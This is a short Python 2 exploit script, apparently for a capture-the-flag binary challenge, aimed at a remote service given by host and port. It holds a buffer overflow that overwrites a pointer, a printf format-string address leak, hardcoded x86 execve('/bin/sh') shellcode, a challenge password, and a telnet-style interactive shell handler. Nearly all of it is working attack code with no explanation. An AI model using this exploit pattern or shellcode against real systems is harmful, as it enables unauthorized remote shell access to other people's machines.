#!/usr/bin/python
# -*- coding:utf-8 -*-

import os,sys,socket,struct,telnetlib


def sock(remoteip,remoteport):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remoteip,remoteport))
    f = s.makefile('rw',bufsize=0)
    return s,f

def read_until(f,delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

p32=lambda x:struct.pack('<I',x)

def addr_leak(remoteip,remoteport):
    strcmp_plt_addr=0x8049adc
    printf_addr=0x08048466
    buf='A'*32
    buf+=p32(strcmp_plt_addr)
    buf2=p32(printf_addr)
    buf2+="%p."*8
    with open('buf','wb') as f:
        f.write(buf+'\n'+buf2+'\n')
    s,f=sock(remoteip,remoteport)
    print s.recv(65535)
    s.send(buf+'\n')
    print s.recv(65535)
    s.send(buf2+'\n')
    d=s.recv(65535)
    s.close()
    return d

def pwn():
    sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x8d\x40\x0b\xcd\x80"
    rwx=0x0804c000  # gdb-peda$ vmmap
    plt_addr= 0xb7fbf000+0x30
    password="D0_u_3nj0y_pwn_m3??"
    
    buf='A'*32
    buf+=p32(rwx)
    buf+=p32(plt_addr)
    
    buf2=password+'\x00'+sc
    
    buf3=p32(rwx+len(password+'\x00'))
    
    s,f=sock(sys.argv[1],int(sys.argv[2]))
    print s.recv(65535)
    s.send(buf+'\n')
    print s.recv(65535)
    s.send(buf2+'\n')
    print s.recv(65535)
    s.send(buf3+'\n')
    s.send('ls\n')
    shell(s)

print addr_leak(sys.argv[1],int(sys.argv[2]))
